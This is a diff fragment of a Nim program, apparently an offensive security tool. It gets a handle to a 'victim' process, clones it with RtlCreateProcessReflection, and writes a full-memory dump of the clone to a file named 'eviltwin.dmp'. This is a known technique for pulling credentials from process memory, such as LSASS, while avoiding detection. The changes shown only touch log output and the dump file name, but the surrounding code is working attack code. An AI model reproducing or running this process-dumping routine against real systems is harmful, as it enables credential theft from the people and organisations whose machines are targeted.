@@ -115,13 +115,13 @@ when isMainModule:
         echo "[*] Quitting!"
         quit(1)
     else:
-        echo "[+] Obtained handle to process! Error: ", GetLastError()
+        echo "[+] Obtained handle to process!"
     echo "[*] Cloning process"
     var reflectRet: NTSTATUS = RtlCreateProcessReflection(victimHandle, cast[ULONG](RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES), NULL, NULL, cast[HANDLE](NULL), addr info)
-    echo reflectRet
+    #echo reflectRet
     if GetLastError() == 0:
-        echo info
-        echo "[+] Succesfully cloned to new PID: UniqueProcess - ", cast[DWORD](info.ReflectionClientId.UniqueProcess)
+        #echo info
+        echo "[+] Succesfully cloned to new PID: ", cast[DWORD](info.ReflectionClientId.UniqueProcess)
     elif GetLastError() == 5:
         echo "[-] Error cloned: Access Denied!"
         #discard readLine(stdin)
@@ -135,7 +135,7 @@ when isMainModule:
 
     #discard readLine(stdin)
 
-    var outFile = CreateFile("clone.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))
+    var outFile = CreateFile("eviltwin.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))
     if MiniDumpWriteDump(info.ReflectionProcessHandle, cast[DWORD](info.ReflectionClientId.UniqueProcess), outFile, 0x00000002, NULL, NULL, NULL) == TRUE:
         echo "[+] Sucessfully dumped process!"
         TerminateProcess(info.ReflectionProcessHandle, 0)
